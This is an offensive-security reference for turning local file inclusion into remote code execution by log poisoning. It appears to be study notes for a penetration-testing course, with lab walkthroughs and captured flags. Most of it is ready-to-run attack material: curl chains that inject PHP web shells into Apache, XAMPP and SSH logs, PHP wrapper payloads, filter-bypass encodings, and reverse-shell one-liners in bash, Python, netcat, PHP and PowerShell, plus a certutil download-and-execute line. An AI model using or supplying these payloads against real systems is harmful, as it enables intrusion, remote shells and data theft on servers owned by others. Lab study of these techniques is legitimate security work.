# LFI & Log Poisoning Complete Reference

## Critical Concept
**LFI vs Directory Traversal:**
- **Directory Traversal**: Only reads files → `admin.php` shows source code
- **LFI (Local File Inclusion)**: Executes files → `admin.php` runs the PHP
- **Log Poisoning**: Inject PHP into logs → Include log → Execute commands

## Platform Detection via LFI
First, identify the target OS:

```bash
# Linux indicators
curl "http://target/index.php?page=/etc/passwd"          # Shows user list
curl "http://target/index.php?page=/etc/os-release"      # Shows distribution

# Windows indicators
curl "http://target/index.php?page=C:\Windows\win.ini"   # Windows config
curl "http://target/index.php?page=C:\Windows\System32\drivers\etc\hosts"
```

## Cross-Platform Quick Reference

| Task | Linux | Windows |
|------|-------|---------|
| **Test File** | `/etc/passwd` | `C:\Windows\win.ini` |
| **List Files** | `ls` | `dir` |
| **Read File** | `cat` | `type` |
| **Path Separator** | `/` | `\` (encode as %5C) |
| **Web Root** | `/var/www/html` | `C:\xampp\htdocs` |
| **Apache Logs** | `/var/log/apache2/` | `C:\xampp\apache\logs\` |
| **Current User** | `whoami` | `whoami` |
| **Network Info** | `ifconfig` or `ip a` | `ipconfig` |

## Linux Attack Chain

### 1. Test LFI
```bash
curl "http://target.com/index.php?page=/etc/passwd"
```

### 2. Access Apache Log
```bash
curl "http://target.com/index.php?page=../../../../../../../../../var/log/apache2/access.log"
```

### 3. Poison Log
```bash
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://target.com/index.php"
```

### 4. Execute Commands
```bash
curl "http://target.com/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id"
```

### 5. Reverse Shell
```bash
# Start listener
nc -nvlp 4444

# Trigger shell
curl "http://target.com/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%22"
```

## Windows Attack Chain

### 1. Test LFI
```bash
curl "http://target.com/index.php?page=C:\Windows\System32\drivers\etc\hosts"
```

### 2. Access XAMPP Log
```bash
# Direct path
curl "http://target.com/index.php?page=C:\xampp\apache\logs\access.log"

# With traversal
curl "http://target.com/index.php?page=..\..\..\..\..\..\..\..\xampp\apache\logs\access.log"

# URL encoded
curl "http://target.com/index.php?page=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cxampp%5Capache%5Clogs%5Caccess.log"
```

### 3. Poison Log
```bash
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://target.com/index.php"
```

### 4. Execute Commands
```bash
# List directory
curl "http://target.com/index.php?page=C:\xampp\apache\logs\access.log&cmd=dir"

# Read file
curl "http://target.com/index.php?page=C:\xampp\apache\logs\access.log&cmd=type%20flag.txt"
```

### 5. Windows Reverse Shell
```bash
# PowerShell reverse shell
curl "http://target.com/index.php?page=C:\xampp\apache\logs\access.log&cmd=powershell%20-nop%20-c%20%22%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient%28%27YOUR_IP%27%2C%204444%29%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream%28%29%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter%28%24NetworkStream%29%3Bfunction%20WriteToStream%20%28%24String%29%7BWrite-Host%20%24String%3B%24StreamWriter.WriteLine%28%24String%29%3B%24StreamWriter.Flush%28%29%7DWriteToStream%20%27%27%3Bwhile%28%28%24BytesRead%20%3D%20%24NetworkStream.Read%28%24Bytes%2C%200%2C%20%24Bytes.Length%29%29%20-gt%200%29%7B%24Command%20%3D%20%28%5Btext.encoding%5D%3A%3AUTF8%29.GetString%28%24Bytes%2C%200%2C%20%24BytesRead%20-%201%29%3BWriteToStream%20%28Invoke-Expression%20%24Command%202%3E%261%20%7C%20Out-String%20%29%7D%24StreamWriter.Close%28%29%22"
```

## URL Encoding Cheat Sheet
```
Space     → %20
"         → %22
'         → %27
>         → %3E
&         → %26
/         → %2F
\         → %5C (Windows paths)
<         → %3C
;         → %3B
|         → %7C
(         → %28
)         → %29
$         → %24
:         → %3A
```

## Common Log Locations

### Linux
```bash
# Apache
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log

# Nginx
/var/log/nginx/access.log
/var/log/nginx/error.log

# SSH (poison with failed login username)
/var/log/auth.log
/var/log/secure

# Mail
/var/mail/www-data
/var/spool/mail/www-data

# Other
/proc/self/environ
/proc/self/fd/2
```

### Windows
```
# XAMPP
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log

# IIS
C:\inetpub\logs\LogFiles\W3SVC1\
C:\Windows\System32\LogFiles\

# WAMP
C:\wamp\logs\access.log
C:\wamp64\logs\access.log
```

## Real Attack Examples

### Linux: Mountain Desserts (192.168.133.16)
```bash
# 1. Verify LFI
curl "http://mountaindesserts.com/meteor/index.php?page=/etc/passwd"

# 2. Poison log
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://mountaindesserts.com/meteor/index.php"

# 3. Execute command
curl "http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id"
# Output: uid=33(www-data) gid=33(www-data)

# 4. Get shell (start nc -nvlp 4444 first)
curl "http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.243%2F4444%200%3E%261%22"

# 5. Escalate
sudo -l
# Output: (ALL) NOPASSWD: ALL

# 6. Get flag
sudo cat /home/ariella/flag.txt
# Flag: OS{3005bcd18b2463ba12fb7366f1671552}
```

### Windows: XAMPP Target (192.168.133.193)
```bash
# 1. Verify LFI
curl "http://192.168.133.193/meteor/index.php?page=C:\Windows\System32\drivers\etc\hosts"

# 2. Access XAMPP log
curl "http://192.168.133.193/meteor/index.php?page=C:\xampp\apache\logs\access.log"

# 3. Poison log
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.133.193/meteor/index.php"

# 4. List directory
curl "http://192.168.133.193/meteor/index.php?page=C:\xampp\apache\logs\access.log&cmd=dir"
# Found: hopefullynobodyfindsthisfilebecauseitssupersecret.txt (38 bytes)

# 5. Read flag
curl "http://192.168.133.193/meteor/index.php?page=C:\xampp\apache\logs\access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt"
```

## Alternative Payloads

### PHP Execution Methods
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo `$_GET[cmd]`; ?>
<?php eval($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

### Linux Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/sh IP PORT

# PHP
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Windows Reverse Shells
```powershell
# PowerShell TCP
$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Certutil download
certutil.exe -urlcache -f http://IP/shell.exe shell.exe && shell.exe

# Netcat Windows
nc.exe -e cmd.exe IP PORT
```

## PHP Wrappers (Bypass Filters)

### Base64 Read Source
```bash
# Linux/Windows
curl "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
echo "BASE64_STRING" | base64 -d
```

### Direct Execution
```bash
# Data wrapper
curl "http://target.com/index.php?page=data://text/plain,<?php system('id'); ?>"
curl "http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="

# Input wrapper
curl -X POST -d "<?php system('id'); ?>" "http://target.com/index.php?page=php://input"
```

## Advanced Techniques

### SSH Log Poisoning (Linux)
```bash
# Poison auth.log with PHP in username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Include poisoned log
curl "http://target.com/index.php?page=/var/log/auth.log&cmd=id"
```

### IIS Log Poisoning (Windows)
```bash
# IIS logs typically in
curl "http://target.com/index.php?page=C:\inetpub\logs\LogFiles\W3SVC1\u_ex[DATE].log"
```

### Bypassing WAF/Filters
```bash
# Double encoding
page=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252fetc%252fpasswd

# Mixed encoding
page=.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd

# UTF-8 encoding
page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Null byte (PHP < 5.3)
page=../../../../../etc/passwd%00
```

## Troubleshooting

### Platform-Agnostic Issues
1. **Wrong IP in reverse shell**: Use YOUR attacking machine IP
2. **Port blocked**: Try 80, 443, 8080, 9001
3. **PHP functions disabled**: Try all execution methods

### Linux-Specific
1. **Shell not interactive**: Use `python -c 'import pty;pty.spawn("/bin/bash")'`
2. **Permission denied**: Check `sudo -l` for privileges
3. **Log rotation**: Logs might be compressed (.gz)

### Windows-Specific
1. **PowerShell blocked**: Try `cmd /c powershell` or base64 encoding
2. **Execution policy**: Use `-ep bypass` flag
3. **Antivirus**: Stage payload download vs direct execution
4. **Firewall**: Windows Firewall may block outbound connections

## Quick Win Checklist

### Initial Recon
- [ ] Identify OS via LFI test files
- [ ] Check if logs are readable
- [ ] Test PHP wrapper support

### Linux Targets
- [ ] Test `/etc/passwd`
- [ ] Check Apache/Nginx logs
- [ ] Try SSH log poisoning
- [ ] Check `sudo -l` after shell

### Windows Targets
- [ ] Test `C:\Windows\win.ini`
- [ ] Check XAMPP/WAMP/IIS logs
- [ ] Try PowerShell reverse shell
- [ ] Look for obvious flag files with `dir`

### Post-Exploitation
- [ ] Search for flags:
  - Linux: `find / -name "*.txt" 2>/dev/null | grep -E "flag|root|proof"`
  - Windows: `dir C:\ /s /b | findstr flag`
- [ ] Check home directories
- [ ] Review web root for config files

## LFI to RCE Methods Ranked

1. **Log Poisoning** (Most Common)
   - Works on both Linux and Windows
   - Multiple log targets available

2. **PHP Session Poisoning**
   - `/tmp/sess_*` (Linux)
   - `C:\Windows\Temp\sess_*` (Windows)

3. **PHP Wrappers**
   - data:// and php://input
   - Platform independent

4. **File Upload + LFI**
   - Upload shell, include via LFI

5. **Process Environ**
   - Linux: `/proc/self/environ`
   - Less common on Windows

## Remember
- **Target connects to YOU** in reverse shell
- **Always escape $** in bash when injecting PHP
- **Windows uses backslash** (`\`), Linux uses forward slash (`/`)
- **Start listener BEFORE** triggering reverse shell
- **URL encode special characters** based on platform
- **Test multiple log locations** if first attempt fails